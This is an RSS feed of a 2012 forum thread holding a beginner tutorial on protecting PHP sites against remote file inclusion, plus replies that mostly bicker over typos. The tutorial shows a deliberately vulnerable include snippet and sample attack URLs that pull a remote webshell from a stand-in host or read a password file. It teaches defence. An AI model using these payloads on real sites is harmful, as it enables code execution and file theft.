<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
    <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326</link>
    <description>Security is a major part of the internet, users are going to want to use a secure site. Whether it&#39;s HTTPS, or protection from common methods. I&#39;ll be going over the RFI method that hackers use to hack a website, I&#39;ll elaborate some on it, and explain how to prevent it.

Let&#39;s explain RFI;Remote file Inclusion.. It&#39;s a type of vulnerability that allows an hacker to include a remote file, which can usually be done through a script on the web server. It&#39;s caused mainly by not protecting correctly, and not prompting with proper validation of the user supplied data. It can give the hackers access to execute code on the web server, or execute code client sided, through javascript, which can lead to another attack method called Cross Site Scripting (XSS). It can also lead to Denial of Service (DoS or known as DDoS), and/or Data Theft.

Since most RFI attacks happen through PHP, a scripting/programming language used in web development, its cause is due to the use of un-validated external variables, such as $_GET, $_POST, or $_COOKIE with the Filesystem Function. Most of the time it&#39;s new programmers, that aren&#39;t fully efficient with PHP. If &#39;allow_url_fopen&#39; is enabled, it allows filesystem functions to use a URL which allows them to retrieve data from remote locations. The common way a hacker does it is change the variables that is passed to one of these functions, and they change the variable to something that can contain malicious code, from a remote place or resource. To prevent this attack, all user input needs to be validated and confirmed before being used.

Let&#39;s start with an example.. (This code includes a file, that&#39;s requested)
[code]
&lt;?php
	$name = &#39;Tony&#39;;
	if (isset( $_GET[&#39;NAME&#39;] ) )
		$name = $_GET[&#39;NAME&#39;];
	include( $name . &#39;.php&#39; );
?&gt;

&lt;form method=&quot;get&quot;&gt;
	&lt;select name=&quot;NAME&quot;&gt;
		&lt;option value=&quot;James&quot;&gt;James&lt;/option&gt;
		&lt;option value=&quot;Matt&quot;&gt;Matt&lt;/option&gt;
	&lt;/select&gt;
	&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
[/code]

In the example above, it goes to a different file for variables, the developer had intended for only James.php and Matt.php to be used as options, however. Anyone can manipulate the variables for NAME and put whatever they&#39;d like, here are a few examples.
Default Usage: /page.php?NAME=URL
Inject a remotely hosted file that can contain malicious code: /page.php?NAME=http://website.com/webshell.txt?
Allow hacker to read contents of a password file: /page.php?NAME=/fldr/passwd%00
LFI;Local File Incluson: /page.php?NAME=C:\\ftp\\upload\\exploit

To prevent something like this from happening, you&#39;ll what to define what names can be used in this form. You&#39;ll use an array to list the names that are okay to use, Like so:
[code]&lt;?php
// Local variable with default value
	$name = &#39;Tony&#39;;
	
// ALL possible names
$allowednames = array 
(
	&#39;Tony&#39;,
	&#39;James&#39;,
	&#39;Matt&#39;
);

// If Statement to check if the user even supplied a value
if(isset($_GET[&#39;NAME&#39;])) {
	$_GET[&#39;NAME&#39;] = trim($_GET[&#39;NAME&#39;]);
	
	//Check array for allowed names
	if(in_array($_GET[&#39;NAME&#39;], $allowednames, TRUE))
	{
		$NAME = $_GET[&#39;NAME&#39;];
	} else {
		// If name is un-allowed, do something.
	}
}
?&gt;
[/code]

Basically this code does the following (in order)..
1. Define the default Name variable, locally.
2. Create an array/list of what names are okay to use.
3. Strip any extra spaces at the start or end of the input.
4. Get the user input, and compare it with the array values.
5. If there is a match, than continue. If there is an error, do something else, and don&#39;t let the user proceed.

This is probably the easiest way to prevent something like this, there are other methods if I&#39;m right, you&#39;ll have to check elsewhere and search around a bit. I don&#39;t know enough about the other methods to teach it, let alone remember how to do them. 

Thanks for checking out this tutorial, RFI is an important thing to protect, as it&#39;s most (or almost most) common method that attackers may use. I&#39;ll be coming out with some more security tutorials soon! - The Web Guy</description>
    
    <lastBuildDate>Tue, 11 Sep 2012 06:52:05 +0000</lastBuildDate>
    <category>General Programming</category>
    <atom:link href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@Ruby_Forums_Coder Ruby]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ruby_forums_coder">@Ruby_Forums_Coder</a> wrote:</p>
          <blockquote>
              <p>I actually like it when justaguy posts, he keeps everyone on their toes <img src="https://forum.moparisthebest.com/images/emoji/twitter/stuck_out_tongue.png?v=5" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/9">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/9</link>
        <pubDate>Tue, 11 Sep 2012 06:52:05 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-9</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@The_Web_Guy The Web Guy]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/the_web_guy">@The_Web_Guy</a> wrote:</p>
          <blockquote>
              <p>[quote=“justaguy, post:7, topic:459326”][quote author=The Web Guy link=topic=562232.msg4100023#msg4100023 date=1347330112]</p>
<aside class="quote no-group">
<blockquote>
<aside class="quote no-group">
<blockquote>
<aside class="quote no-group">
<blockquote>
<aside class="quote no-group">
<blockquote>
<p>which can lead to another attack method called Cross Site Scripting (XXS). It can also lead to Denial of Server (DoS or known as DDoS), and/or Data Theft.</p>
</blockquote>
</aside>
<p>XSS*, Denial of Service*.<br>
PHP also isn’t the only language that is open to RFI attacks.</p>
</blockquote>
</aside>
<p>No need to get jealous <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
</blockquote>
</aside>
<p>Lol, funny joke.</p>
</blockquote>
</aside>
<p>I’m being honest, wasn’t meant to be a joke. Every time I release something or put out a tutorial you post on it, trying your hardest to point out something I did wrong. Let’s not get jelly here, you can’t be the only Website Developer.  <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"><br>
[/quote]</p>
<p>My intentions are to help people correct their mistakes, not to boost my own ego.[/quote]</p>
<p>Then shhhhh young one. :I<br>
<div class="lightbox-wrapper"><a class="lightbox" href="http://i46.tinypic.com/28cldmd.jpg" title="28cldmd.jpg" rel="nofollow noopener"><img src="http://i46.tinypic.com/28cldmd.jpg" alt width="530" height="500"><div class="meta">
<svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename">28cldmd.jpg</span><span class="informations">532×501</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg>
</div></a></div></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/8">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/8</link>
        <pubDate>Tue, 11 Sep 2012 02:30:54 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-8</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@justaguy justaguy]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/justaguy">@justaguy</a> wrote:</p>
          <blockquote>
              <p>[quote=“The Web Guy, post:6, topic:459326”][quote author=justaguy link=topic=562232.msg4100022#msg4100022 date=1347329944]</p>
<aside class="quote">
<blockquote>
<aside class="quote">
<blockquote>
<aside class="quote">
<blockquote>
<p>which can lead to another attack method called Cross Site Scripting (XXS). It can also lead to Denial of Server (DoS or known as DDoS), and/or Data Theft.</p>
</blockquote>
</aside>
<p>XSS*, Denial of Service*.<br>
PHP also isn’t the only language that is open to RFI attacks.</p>
</blockquote>
</aside>
<p>No need to get jealous <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=5" title=":wink:" class="emoji" alt=":wink:"></p>
</blockquote>
</aside>
<p>Lol, funny joke.<br>
[/quote]</p>
<p>I’m being honest, wasn’t meant to be a joke. Every time I release something or put out a tutorial you post on it, trying your hardest to point out something I did wrong. Let’s not get jelly here, you can’t be the only Website Developer.  ;)[/quote]</p>
<p>My intentions are to help people correct their mistakes, not to boost my own ego.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/7">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/7</link>
        <pubDate>Tue, 11 Sep 2012 02:25:25 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-7</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@The_Web_Guy The Web Guy]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/the_web_guy">@The_Web_Guy</a> wrote:</p>
          <blockquote>
              <p>[quote=“justaguy, post:5, topic:459326”][quote author=The Web Guy link=topic=562232.msg4100021#msg4100021 date=1347329862]</p>
<aside class="quote">
<blockquote>
<aside class="quote">
<blockquote>
<p>which can lead to another attack method called Cross Site Scripting (XXS). It can also lead to Denial of Server (DoS or known as DDoS), and/or Data Theft.</p>
</blockquote>
</aside>
<p>XSS*, Denial of Service*.<br>
PHP also isn’t the only language that is open to RFI attacks.</p>
</blockquote>
</aside>
<p>No need to get jealous <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=5" title=":wink:" class="emoji" alt=":wink:"><br>
[/quote]</p>
<p>Lol, funny joke.[/quote]</p>
<p>I’m being honest, wasn’t meant to be a joke. Every time I release something or put out a tutorial you post on it, trying your hardest to point out something I did wrong. Let’s not get jelly here, you can’t be the only Website Developer.  <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=5" title=":wink:" class="emoji" alt=":wink:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/6">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/6</link>
        <pubDate>Tue, 11 Sep 2012 02:21:52 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-6</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@justaguy justaguy]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/justaguy">@justaguy</a> wrote:</p>
          <blockquote>
              <p>[quote=“The Web Guy, post:4, topic:459326”][quote author=justaguy link=topic=562232.msg4099933#msg4099933 date=1347323725]</p>
<aside class="quote">
<blockquote>
<p>which can lead to another attack method called Cross Site Scripting (XXS). It can also lead to Denial of Server (DoS or known as DDoS), and/or Data Theft.</p>
</blockquote>
</aside>
<p>XSS*, Denial of Service*.<br>
PHP also isn’t the only language that is open to RFI attacks.<br>
[/quote]</p>
<p>No need to get jealous ;)[/quote]</p>
<p>Lol, funny joke.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/5</link>
        <pubDate>Tue, 11 Sep 2012 02:19:04 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-5</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@The_Web_Guy The Web Guy]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/the_web_guy">@The_Web_Guy</a> wrote:</p>
          <blockquote>
              <aside class="quote quote-modified" data-post="3" data-topic="459326">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="https://forum.moparisthebest.com/user_avatar/forum.moparisthebest.com/justaguy/40/61_1.png" class="avatar"> justaguy:</div>
<blockquote>
<p>[quote]which can lead to another attack method called Cross Site Scripting (XXS). It can also lead to Denial of Server (DoS or known as DDoS), and/or Data Theft.</p>
</blockquote>
</aside>
<p>XSS*, Denial of Service*.<br>
PHP also isn’t the only language that is open to RFI attacks.[/quote]</p>
<p>I was tried and threw this together quick, No need to get jealous <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=5" title=":wink:" class="emoji" alt=":wink:"><br>
And I know, obviously. But it’s the most common method.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/4</link>
        <pubDate>Tue, 11 Sep 2012 02:17:42 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-4</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@justaguy justaguy]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/justaguy">@justaguy</a> wrote:</p>
          <blockquote>
              <blockquote>which can lead to another attack method called Cross Site Scripting (XXS). It can also lead to Denial of Server (DoS or known as DDoS), and/or Data Theft.</blockquote>
<p>XSS*, Denial of Service*.<br>
PHP also isn’t the only language that is open to RFI attacks.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/3</link>
        <pubDate>Tue, 11 Sep 2012 00:35:25 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-3</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@Ruby_Forums_Coder Ruby]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ruby_forums_coder">@Ruby_Forums_Coder</a> wrote:</p>
          <blockquote>
              <p>Great tutorial man, can’t wait to see more.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/2</link>
        <pubDate>Mon, 10 Sep 2012 23:56:10 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-2</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
      <item>
        <title>[Website Security] Protecting against Remote File Inclusion [Tutorial]</title>
        <dc:creator><![CDATA[@The_Web_Guy The Web Guy]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/the_web_guy">@The_Web_Guy</a> wrote:</p>
          <blockquote>
              <p>Security is a major part of the internet, users are going to want to use a secure site. Whether it’s HTTPS, or protection from common methods. I’ll be going over the RFI method that hackers use to hack a website, I’ll elaborate some on it, and explain how to prevent it.</p>
<p>Let’s explain RFI;Remote file Inclusion… It’s a type of vulnerability that allows an hacker to include a remote file, which can usually be done through a script on the web server. It’s caused mainly by not protecting correctly, and not prompting with proper validation of the user supplied data. It can give the hackers access to execute code on the web server, or execute code client sided, through javascript, which can lead to another attack method called Cross Site Scripting (XSS). It can also lead to Denial of Service (DoS or known as DDoS), and/or Data Theft.</p>
<p>Since most RFI attacks happen through PHP, a scripting/programming language used in web development, its cause is due to the use of un-validated external variables, such as $_GET, $_POST, or $_COOKIE with the Filesystem Function. Most of the time it’s new programmers, that aren’t fully efficient with PHP. If ‘allow_url_fopen’ is enabled, it allows filesystem functions to use a URL which allows them to retrieve data from remote locations. The common way a hacker does it is change the variables that is passed to one of these functions, and they change the variable to something that can contain malicious code, from a remote place or resource. To prevent this attack, all user input needs to be validated and confirmed before being used.</p>
<p>Let’s start with an example… (This code includes a file, that’s requested)</p>
<pre><code class="lang-auto">&lt;?php
	$name = 'Tony';
	if (isset( $_GET['NAME'] ) )
		$name = $_GET['NAME'];
	include( $name . '.php' );
?&gt;

&lt;form method="get"&gt;
	&lt;select name="NAME"&gt;
		&lt;option value="James"&gt;James&lt;/option&gt;
		&lt;option value="Matt"&gt;Matt&lt;/option&gt;
	&lt;/select&gt;
	&lt;input type="submit"&gt;
&lt;/form&gt;</code></pre>
<p>In the example above, it goes to a different file for variables, the developer had intended for only James.php and Matt.php to be used as options, however. Anyone can manipulate the variables for NAME and put whatever they’d like, here are a few examples.<br>
Default Usage: /page.php?NAME=URL<br>
Inject a remotely hosted file that can contain malicious code: /page.php?NAME=http://website.com/webshell.txt?<br>
Allow hacker to read contents of a password file: /page.php?NAME=/fldr/passwd%00<br>
LFI;Local File Incluson: /page.php?NAME=C:\ftp\upload\exploit</p>
<p>To prevent something like this from happening, you’ll what to define what names can be used in this form. You’ll use an array to list the names that are okay to use, Like so:</p>
<p>[code]&lt;?php<br>
// Local variable with default value<br>
$name = ‘Tony’;</p>
<p>// ALL possible names<br>
$allowednames = array<br>
(<br>
‘Tony’,<br>
‘James’,<br>
‘Matt’<br>
);</p>
<p>// If Statement to check if the user even supplied a value<br>
if(isset($_GET[‘NAME’])) {<br>
$_GET[‘NAME’] = trim($_GET[‘NAME’]);</p>
<pre><code>//Check array for allowed names
if(in_array($_GET['NAME'], $allowednames, TRUE))
{
	$NAME = $_GET['NAME'];
} else {
	// If name is un-allowed, do something.
}
</code></pre>
<p>}<br>
?&gt;<br>
[/code]</p>
<p>Basically this code does the following (in order)…</p>
<ol>
<li>Define the default Name variable, locally.</li>
<li>Create an array/list of what names are okay to use.</li>
<li>Strip any extra spaces at the start or end of the input.</li>
<li>Get the user input, and compare it with the array values.</li>
<li>If there is a match, than continue. If there is an error, do something else, and don’t let the user proceed.</li>
</ol>
<p>This is probably the easiest way to prevent something like this, there are other methods if I’m right, you’ll have to check elsewhere and search around a bit. I don’t know enough about the other methods to teach it, let alone remember how to do them.</p>
<p>Thanks for checking out this tutorial, RFI is an important thing to protect, as it’s most (or almost most) common method that attackers may use. I’ll be coming out with some more security tutorials soon! - The Web Guy</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326/1</link>
        <pubDate>Mon, 10 Sep 2012 23:51:13 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-459326-1</guid>
        <source url="https://forum.moparisthebest.com/t/website-security-protecting-against-remote-file-inclusion-tutorial/459326.rss">[Website Security] Protecting against Remote File Inclusion [Tutorial]</source>
      </item>
  </channel>
</rss>
